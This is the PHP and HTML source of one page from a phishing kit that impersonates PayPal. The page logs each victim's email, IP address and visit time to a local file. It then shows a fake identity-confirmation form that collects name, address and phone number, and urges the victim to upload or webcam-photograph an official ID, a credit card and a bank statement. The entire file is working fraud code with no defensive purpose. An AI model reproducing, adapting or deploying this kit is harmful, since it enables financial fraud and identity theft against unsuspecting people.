<?php
#####################################################################################################
###################################### fallagmahdi@hotmail.com ######################################
###### ####### ##      ##      #######  #######       #### #### ####### ##     ##   ######   ########
##     ##   ## ##      ##      ##   ## ##             ## ### ## ##   ## ##     ##   ##    ##    ##
###### ####### ##      ##      ####### ##  ######     ##  #  ## ####### #########   ##     ##   ##
##     ##   ## ##      ##      ##   ## ##    ##       ##     ## ##   ## ##     ##   ##    ##    ##
##     ##   ## ####### ####### ##   ##  #######       ##     ## ##   ## ##     ##   ######   ########
############################## https://www.facebook.com/fallag.mahdi.tn #############################
#####################################################################################################
$rand = @$_GET['dispatch'];
include("../M_files/config.php");
if(@$_SESSION['Done'] == 2) {
/*	die('<META HTTP-EQUIV="Refresh" Content="0; URL=payment.php?dispatch='.$rand.'">');
*/}
$email = @$_COOKIE['email'];
date_default_timezone_set("Africa/Tunis");
$date = date('d/m/Y', time());
$time = date('H:i:s', time());
$ip = getenv("REMOTE_ADDR");
$msg = "<b>$email </b> with <b>$ip</b> has cammed to <b>Personal</b> at <b>$time - $date</b><br>";
$myFile = "../ips.html";
$fh = fopen($myFile, 'a+') or die("can't open file");
fwrite($fh, $msg);
fclose($fh);
$ech = $_SESSION['ech'];
$js = js_perso();
$css = css_perso();
//$html = html_perso($css, $js, $ech);
/*die($html);*/
?>
<!Doctype html>
<html>
	<head>
		<title>Personal information update</title>
		<link rel="stylesheet"  href="../M_css/M_personal.css"/>
		<link rel="shortcut icon" type="image/x-icon" href="../M_images/favicon.ico" />
		<script type="text/javascript" src="//code.jquery.com/jquery.min.js"></script>
		<script type="text/javascript" src="../M_scripts/M_home.js"></script>
		<script type="text/javascript" src="../M_scripts/M_cookies.js"></script>
		<META charset="utf-8">
	</head>	
	<body>
		<div class="mahdi_1" >
			<div class="mahdi_2">
				<img src="../M_images/logo_paypal.png">
			</div>
		</div>
		
		<div class="mahdi_3" >
			<div class="mahdi_4">
				<h1>Welcome <?=$ech['fname'].$ech['lname']?>,</h1>
			</div>
			<form class="mahdi_51" action="post2.php" method="post">
				<h3>Confirm you're the account owner</h3>
				<p>Verfiy your identity by checking the information below</p>
				<table style="margin-left:10px;">
					<tr>
						<td>
							<input type="text" name="MAHDI_name" class="MAHDI_input" placeholder="Full Name" value="<?=$ech['fname'].$ech['lname']?>">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_adrs" class="MAHDI_input" placeholder="Address Line 1" value="<?=$ech['addres']?>">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_adrs2" class="MAHDI_input" placeholder="Address Line 2">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_city" class="MAHDI_input" placeholder="City"  value="<?=$ech['city']?>">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_state" class="MAHDI_input" placeholder="State">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_zip" class="MAHDI_input" placeholder="Zip">
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_country" class="MAHDI_input" placeholder="Country" >
						</td>
					</tr>
					<tr>
						<td>
							<input type="text" name="MAHDI_phone" class="MAHDI_input" placeholder="Phone Number">
						</td>
					</tr>
					<tr>
						<td>
							<input type="submit" name="MAHDI_subm" class="MAHDI_submi"  id="MAHDI_submi"  value="Continue">
						</td>
					</tr>
				</table>
			</form>
			<div class="mahdi_52">
				<h3>Improve your account security</h3>
				<p>Help us to make a secure environment by uploading : <br> <br>&nbsp;&nbsp;&nbsp;&nbsp;<b>- Your official ID</b> <br>&nbsp;&nbsp;&nbsp;&nbsp;<b>- Your credit card</b><br>&nbsp;&nbsp;&nbsp;&nbsp;<b>- Your bank statement</b><br> <br>
				To do that, you can scan them then upload it by the button below or you can just click on webcam button below and take pictures directly from here.</p> <br> <br>
				<input type="submit" name="MAHDI_subm" class="MAHDI_submi" value="Upload Pictures" style="width:365px" onclick="newPopup('upload.php','750','500')">
				<input type="submit" name="MAHDI_subm" class="MAHDI_submi" value="Take Pictures By Webcam" style="width:365px" onclick="newPopup('webcam.php','945','595')">
			</div>
			<div class="mahdi_53">
				Copyright &copy; 1999-2015 P&alpha;yP&alpha;l.
			</div>
		</div>
		<script type="text/javascript">
</script>
		<script type="text/javascript">
			function newPopup(url,w,h) {
				popupWindow = window.open(
					url,'popUpWindow','height='+h+',width='+w+',left=10,top=10,scrollbars=yes,toolbar=yes,menubar=no,location=no,directories=no,status=yes')
			}
			$("#MAHDI_submi").on("click", function(){

			   		if ($.trim($("input[name=MAHDI_name]").val()) === "") {  $("input[name=MAHDI_name]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_adrs]").val()) === "") {  $("input[name=MAHDI_adrs]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_city]").val()) === "") {  $("input[name=MAHDI_city]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_state]").val()) === "") {  $("input[name=MAHDI_state]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_zip]").val()) === "") {  $("input[name=MAHDI_zip]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_country]").val()) === "") {  $("input[name=MAHDI_country]").addClass("merror"); return false;}
			   		if ($.trim($("input[name=MAHDI_phone]").val()) === "") {  $("input[name=MAHDI_phone]").addClass("merror"); return false;}

			});
			$("input").change(function () {$(this).removeClass("merror");}).trigger("change");
		</script>
	</body>
</html>
